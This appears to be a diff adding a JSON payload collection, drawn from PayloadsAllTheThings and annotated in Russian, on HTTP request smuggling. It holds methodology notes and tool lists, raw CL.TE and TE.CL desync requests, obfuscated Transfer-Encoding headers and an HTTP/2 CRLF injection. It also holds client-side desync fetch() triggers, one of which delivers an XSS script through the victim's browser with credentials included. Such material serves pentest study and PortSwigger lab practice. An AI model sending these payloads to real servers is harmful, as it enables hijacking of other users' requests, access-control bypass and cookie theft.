@@ -1,0 +1,148 @@
+{
+  "category": "Request Smuggling",
+  "source": "PayloadsAllTheThings/Request Smuggling/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое HTTP Request Smuggling",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "HTTP Request Smuggling возникает, когда запрос обрабатывают несколько «звеньев» (фронтенд/прокси/CDN и бэкенд), но они по-разному определяют, где запрос начинается и где заканчивается. Это расхождение позволяет вмешаться в чужой запрос/ответ или обойти контроли доступа.\n\nОбычно причина — разный приоритет HTTP-заголовков (Content-Length против Transfer-Encoding), разная обработка «кривых» заголовков (например, игнорируется ли заголовок с неожиданным пробелом), даунгрейд запроса с более нового протокола (HTTP/2 → HTTP/1.1) или разница в том, когда частичный запрос считается «протухшим» и должен быть отброшен."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как тестировать вручную",
+      "language": "text",
+      "tags": ["methodology", "how-to-test"],
+      "body": "• Цель — два звена в цепочке: фронтенд (reverse-proxy, load balancer, CDN) и бэкенд. Десинк возможен, когда они расходятся в трактовке границ запроса.\n• Базовые классы: CL.TE (фронт читает Content-Length, бэк — Transfer-Encoding), TE.CL (наоборот), TE.TE (оба понимают TE, но одного заставляют его не обрабатывать обфускацией).\n• При ручной эксплуатации TE.CL придётся вручную считать размер чанка для второго (вредоносного) запроса — PortSwigger прямо предупреждает: «Manually fixing the length fields in request smuggling attacks can be tricky».\n• В Burp Repeater отключи авто-пересчёт Content-Length (Repeater → меню → снять галку «Update Content-Length»), иначе Burp сам «починит» payload.\n• Не забывай завершающую последовательность \\r\\n\\r\\n после финального 0 в chunked-теле."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Детект по таймингу (timing-based)",
+      "language": "text",
+      "tags": ["methodology", "detection", "timing"],
+      "body": "Безопасный способ нащупать десинк — по задержке ответа.\n\nCL.TE: фронт пересылает тело по Content-Length, бэк ждёт завершающий chunk по Transfer-Encoding. Если объявить chunked, но не прислать терминатор, бэк «зависает» в ожидании следующего чанка → заметная задержка ответа.\n\nTE.CL: наоборот — фронт обрабатывает chunked, бэк читает фиксированную длину по Content-Length и ждёт недостающие байты тела → таймаут/задержка.\n\nЗадержка вместо мгновенного ответа = сильный индикатор десинка. Тайминг безопаснее, чем «отравление», потому что не затрагивает чужие запросы."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "• Burp Suite → extension «HTTP Request Smuggler» (PortSwigger, bappstore) — автодетект и запуск атак смаглинга.\n• defparam/Smuggler — HTTP Request Smuggling / Desync тестер на Python 3.\n• dhmosfunk/simple-http-smuggler-generator — генератор payload'ов под лабы HTTP Request Smuggling и экзамен Burp Suite Practitioner."
+    },
+
+    {
+      "subcategory": "CL.TE",
+      "title": "CL.TE — базовый payload",
+      "language": "http",
+      "tags": ["cl.te", "desync", "exploitation"],
+      "body": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+      "meta": {
+        "tip": "Фронтенд использует Content-Length, бэкенд — Transfer-Encoding. Фронт видит тело длиной 13 байт (включая 0\\r\\n\\r\\nSMUGGLED) и пересылает всё. Бэк по chunked завершает запрос на 0, а «SMUGGLED» остаётся в буфере как начало следующего (чужого) запроса."
+      }
+    },
+    {
+      "subcategory": "CL.TE",
+      "title": "CL.TE — рабочий пример (префикс G)",
+      "language": "http",
+      "tags": ["cl.te", "desync", "exploitation"],
+      "body": "POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG"
+    },
+
+    {
+      "subcategory": "TE.CL",
+      "title": "TE.CL — базовый payload",
+      "language": "http",
+      "tags": ["te.cl", "desync", "exploitation"],
+      "body": "POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0",
+      "meta": {
+        "tip": "Фронтенд использует Transfer-Encoding, бэкенд — Content-Length. Фронт по chunked читает чанк размером 8 («SMUGGLED») и завершающий 0. Бэк же по Content-Length: 3 берёт только первые 3 байта тела, а остаток (начиная с «SMUGGLED») оседает как начало следующего запроса."
+      }
+    },
+    {
+      "subcategory": "TE.CL",
+      "title": "TE.CL — рабочий пример (GPOST)",
+      "language": "http",
+      "tags": ["te.cl", "desync", "exploitation"],
+      "body": "POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n\n",
+      "meta": {
+        "tip": "Чтобы отправить из Burp Repeater, в меню Repeater сними галку «Update Content-Length». Обязательно оставь завершающую последовательность \\r\\n\\r\\n после финального 0. 5c — это hex-размер чанка (вложенного запроса)."
+      }
+    },
+
+    {
+      "subcategory": "TE.TE",
+      "title": "TE.TE — обфускация заголовка Transfer-Encoding",
+      "language": "text",
+      "tags": ["te.te", "obfuscation", "header"],
+      "body": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+      "meta": {
+        "tip": "Оба сервера поддерживают Transfer-Encoding, но один из них можно заставить НЕ обрабатывать его, обфусцировав заголовок. Тогда TE.TE сводится к CL.TE или TE.CL. Подставляй варианты по одному. Здесь [tab], [space], [\\n] — это литералы реальных управляющих символов (табуляция, пробел, перевод строки)."
+      }
+    },
+
+    {
+      "subcategory": "HTTP/2 десинк",
+      "title": "HTTP/2 Request Smuggling — общая идея",
+      "language": "text",
+      "tags": ["http2", "desync", "downgrade"],
+      "body": "HTTP/2 смаглинг возможен, когда промежуточный узел конвертирует твой HTTP/2-запрос в HTTP/1.1, а ты можешь протащить в транслированный запрос невалидный Content-Length, заголовок Transfer-Encoding или переводы строк (CRLF).\n\nСмаглинг возможен и в GET-запросе: если получится спрятать HTTP/1.1-запрос внутри значения HTTP/2-заголовка."
+    },
+    {
+      "subcategory": "HTTP/2 десинк",
+      "title": "HTTP/2 → HTTP/1.1 — CRLF-инъекция в заголовок (H2.X)",
+      "language": "http",
+      "tags": ["http2", "crlf", "desync"],
+      "body": ":method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+      "meta": {
+        "tip": "В значение HTTP/2-заголовка (header) вписаны литеральные \\r\\n\\r\\n и второй HTTP/1.1-запрос. После даунгрейда в HTTP/1.1 эти CRLF разорвут запрос, и спрятанный GET станет отдельным (смаглированным) запросом."
+      }
+    },
+
+    {
+      "subcategory": "Client-Side Desync",
+      "title": "Client-Side Desync — суть техники",
+      "language": "text",
+      "tags": ["client-side-desync", "browser", "concept"],
+      "body": "На некоторых путях сервер не ждёт POST-запросов и трактует их как обычный GET, игнорируя тело. Тогда один отправленный запрос может быть прочитан сервером как ДВА.\n\nКогда бэкенд отвечает дважды, фронтенд считает, что к данному запросу относится только первый ответ — остаток ответов «съезжает» и достаётся следующему запросу/жертве.\n\nФишка client-side desync в том, что атаку запускает сам браузер жертвы (через JavaScript), а не отдельное соединение атакующего."
+    },
+    {
+      "subcategory": "Client-Side Desync",
+      "title": "Client-Side Desync — POST, трактуемый как два запроса",
+      "language": "http",
+      "tags": ["client-side-desync", "desync"],
+      "body": "POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com",
+      "meta": {
+        "tip": "Если путь / не ждёт POST и игнорирует тело, этот запрос может быть прочитан как два: внешний POST и спрятанный в теле GET. Дальше ответы рассинхронизируются между фронтом и бэком."
+      }
+    },
+    {
+      "subcategory": "Client-Side Desync",
+      "title": "Триггер десинка из браузера жертвы (fetch)",
+      "language": "javascript",
+      "tags": ["client-side-desync", "browser", "exploitation"],
+      "body": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+      "meta": {
+        "tip": "JavaScript на сайте атакующего заставляет браузер жертвы отправить POST на уязвимый сайт с её cookie (credentials: 'include'). В теле — спрятанный GET. Так можно: сохранить креды жертвы туда, откуда их заберёт атакующий; заставить жертву отправить эксплойт на недоступный извне внутренний сайт; выполнить произвольный JS как будто от лица сайта."
+      }
+    },
+    {
+      "subcategory": "Client-Side Desync",
+      "title": "Эксплуатация — XSS через client-side desync (redirect + CORS)",
+      "language": "javascript",
+      "tags": ["client-side-desync", "xss", "exploitation"],
+      "body": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
+      "meta": {
+        "tip": "Браузер жертвы шлёт POST на /redirect. Ответ — редирект, заблокированный CORS, из-за чего срабатывает catch и браузер переходит на www.example.com. Сайт же ошибочно обрабатывает HEAD-запрос из тела POST (отдаёт 404 с Content-Length), затем третий запрос (GET /x?x=<script>...) и наконец настоящий GET браузера. Так как браузер отправил только один запрос, он принимает ответ на HEAD как ответ на свой GET, а третий и четвёртый ответы трактует как тело — и исполняет скрипт атакующего."
+      }
+    },
+
+    {
+      "subcategory": "Лабы",
+      "title": "PortSwigger — лабы по Request Smuggling",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• HTTP request smuggling, basic CL.TE vulnerability — portswigger.net/web-security/request-smuggling/lab-basic-cl-te\n• HTTP request smuggling, basic TE.CL vulnerability — portswigger.net/web-security/request-smuggling/lab-basic-te-cl\n• HTTP request smuggling, obfuscating the TE header — portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header\n• Response queue poisoning via H2.TE request smuggling — portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling\n• Client-side desync — portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync"
+    }
+  ]
+}
